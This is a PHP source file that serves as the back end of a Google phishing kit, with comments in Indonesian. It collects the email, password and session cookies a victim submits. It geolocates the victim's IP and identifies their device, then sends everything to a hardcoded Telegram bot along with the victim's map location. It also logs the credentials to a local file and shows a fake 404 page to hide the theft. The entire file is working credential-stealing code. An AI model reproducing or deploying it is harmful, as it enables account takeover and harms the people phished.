<?php
$botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
$chatId = "8753510792";

$date = date('Y-m-d H:i:s');
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$email = $_POST['email'] ?? 'tidak ada';
$password = $_POST['password'] ?? 'tidak ada';
$cookies = $_POST['cookies'] ?? 'tidak ada';

// GeoIP
$geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,region,lat,lon,isp,org,as,mobile,proxy,query");
$geoData = json_decode($geo, true);

// Device detect
function getDevice($ua) {
    if(stripos($ua,'iPhone')) return '📱 iPhone';
    if(stripos($ua,'iPad')) return '📱 iPad';
    if(stripos($ua,'Android')) return '🤖 Android';
    if(stripos($ua,'Windows')) return '💻 Windows';
    if(stripos($ua,'Mac')) return '🍎 Mac';
    return '❓ Unknown';
}
$device = getDevice($userAgent);

// Pesan ke Telegram
$message = "🎭 *GOOGLE ULTIMATE PHISH* 🎭\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📅 Waktu: $date\n";
$message .= "📧 Email: `$email`\n";
$message .= "🔑 Password: `$password`\n";
$message .= "🍪 Cookies: `$cookies`\n\n";
$message .= "🌐 IP: `$ip`\n";
$message .= "📍 Lokasi: {$geoData['city']}, {$geoData['country']}\n";
$message .= "📡 ISP: {$geoData['isp']}\n";
$message .= "📱 Device: $device\n";
$message .= "🔧 UA: `$userAgent`\n";

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message)."&parse_mode=Markdown");

if($geoData['lat'] && $geoData['lon']) {
    file_get_contents("https://api.telegram.org/bot$botToken/sendLocation?chat_id=$chatId&latitude={$geoData['lat']}&longitude={$geoData['lon']}");
}

// Backup ke file
file_put_contents('ultimate_logs.json', json_encode(['time'=>$date,'email'=>$email,'pass'=>$password,'cookies'=>$cookies,'ip'=>$ip,'geo'=>$geoData,'ua'=>$userAgent]) . ",\n", FILE_APPEND);

// ========== REDIRECT KE HALAMAN 404 ==========
header("HTTP/1.0 404 Not Found");
echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>";
exit();
?>